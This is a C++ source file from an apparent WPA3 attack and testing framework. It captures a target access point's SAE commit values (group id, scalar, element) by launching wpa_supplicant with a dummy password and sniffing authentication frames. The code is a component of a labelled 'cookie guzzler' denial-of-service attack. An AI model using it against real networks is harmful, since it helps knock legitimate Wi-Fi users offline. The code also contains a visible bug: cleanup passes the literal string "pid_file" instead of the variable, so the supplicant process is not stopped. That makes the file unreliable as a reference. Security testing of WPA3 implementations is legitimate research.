#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"

#include <fstream>
#include <unistd.h>
#include <csignal>
#include <libtins-src/include/tins/sniffer.h>
#include <tins/hw_address.h>

#include "attacks/DoS_hard/cookie_guzzler/cookie_guzzler.h"
#include "logger/log.h"
#include "system/hw_capabilities.h"
#include "pcap/pcap.h"

using namespace std;
using namespace Tins;
namespace wpa3_tester::cookie_guzzler{

    optional<SAEPair> parse_sae_commit(const uint8_t *packet, const uint32_t len) {
        if (len < 4) return nullopt;

        const uint16_t radiotap_len = *reinterpret_cast<const uint16_t *>(packet + 2);

        constexpr size_t dot11_header = 24;
        constexpr size_t auth_fixed   = 6;
        const size_t auth_offset = radiotap_len + dot11_header;
        const size_t sae_offset  = auth_offset + auth_fixed;

        if (len <= sae_offset) return nullopt;

        const uint16_t algo = *reinterpret_cast<const uint16_t *>(packet + auth_offset);
        const uint16_t seq  = *reinterpret_cast<const uint16_t *>(packet + auth_offset + 2);

        if (algo != 3 || seq != 1) return nullopt;

        const uint8_t *sae_data = packet + sae_offset;
        const size_t   sae_size = len - sae_offset;

        if (sae_size < (2 + 32 + 64)) return nullopt;

        SAEPair frame;
        frame.group_id = *reinterpret_cast<const uint16_t *>(sae_data);
        frame.scalar.assign(sae_data + 2,  sae_data + 34);
        frame.element.assign(sae_data + 34, sae_data + 98);
        return frame;
    }

    SAEPair capture_sae_commit(const string &iface, const HWAddress<6> &ap_mac, const int timeout_sec,  pcap_t *handle) {
        SAEPair result{};
        char errbuf[PCAP_ERRBUF_SIZE];

        if(handle == nullptr){
            handle = pcap_open_live(iface.c_str(), 65535, 1, 100, errbuf);
        }
        if (!handle) throw runtime_error("pcap_open_live failed: " + string(errbuf));

        const string filter_str = "wlan type mgt subtype auth and wlan addr2 " + ap_mac.to_string();
        bpf_program fp{};
        if (pcap_compile(handle, &fp, filter_str.c_str(), 0, PCAP_NETMASK_UNKNOWN) < 0) {
            pcap_close(handle);
            throw runtime_error("pcap_compile failed: " + string(pcap_geterr(handle)));
        }
        pcap_setfilter(handle, &fp);
        pcap_freecode(&fp);

        const auto deadline = steady_clock::now() + seconds(timeout_sec);

        while (steady_clock::now() < deadline) {
            pcap_pkthdr *header;
            const uint8_t *packet;
            const int res = pcap_next_ex(handle, &header, &packet);

            if (res == 0) continue;
            if (res < 0) break;

            const auto frame = parse_sae_commit(packet, header->caplen);
            if (!frame) continue;
            result = frame.value();
            result.success = true;
            log(LogLevel::DEBUG, "SAE payload size: " + to_string(frame->scalar.size()));
            break;
        }

        pcap_close(handle);
        return result;
    }

    void stop_wpa_supplicant(const string &pid_file){
        ifstream file(pid_file);
        if (file.is_open()) {
            pid_t pid;
            file >> pid;
            if (pid > 0) {
                log(LogLevel::INFO, "Stop wpa_supplicant (PID: "+to_string(pid)+")");
                kill(pid, SIGTERM);
            }
            file.close();
            remove(pid_file.c_str());
        }
    }

    // run_cmd for logging or useless:
    void start_wpa_supplicant(const string &iface, const string &conf_path, const string &pid_file) {

        if (filesystem::exists(pid_file)) { stop_wpa_supplicant(pid_file);}

        // Clean up stale socket
        const string socket = "/var/run/wpa_supplicant/" + iface;
        if (filesystem::exists(socket)) filesystem::remove(socket);

        log(LogLevel::INFO, "Run wpa_supplicant to get handshake values...");
        hw_capabilities::run_cmd({
            "wpa_supplicant", "-B",
            "-i", iface,
            "-c", conf_path,
            "-P", pid_file
        });
    }

    string create_wpa_supplicant_config(const string& ssid) {
        string conf_path = "/tmp/wpa3_guzzler_temp"+ssid+".conf";
        ofstream conf(conf_path);

        if (conf.is_open()) {
            conf << "ctrl_interface=/var/run/wpa_supplicant\n";
            conf << "update_config=1\n";
            conf << "network={\n";
            conf << "    ssid=\"" << ssid << "\"\n";
            conf << "    key_mgmt=SAE\n";
            conf << "    sae_password=\"anything123\"\n"; // password doesnt matter
            conf << "    ieee80211w=2\n";
            conf << "}\n";
            conf.close();
        }

        return conf_path;
    }


    SAEPair get_commit_values(const string &iface, const string &sniff_iface, const string &ssid, const HWAddress<6> &ap_mac, const int timeout, pcap_t *handler) {
        if(iface == sniff_iface) throw invalid_argument("Interface names do cant be same");
        const string pid_file = "/tmp/wpa_supplicant_get_commit_values.pid";
        const string conf_path = create_wpa_supplicant_config(ssid);
        start_wpa_supplicant(iface, filesystem::absolute(conf_path), pid_file);
        SAEPair sae_params = capture_sae_commit(sniff_iface, ap_mac, timeout, handler);
        stop_wpa_supplicant("pid_file");
        filesystem::remove(conf_path);
        return sae_params;
    }
}
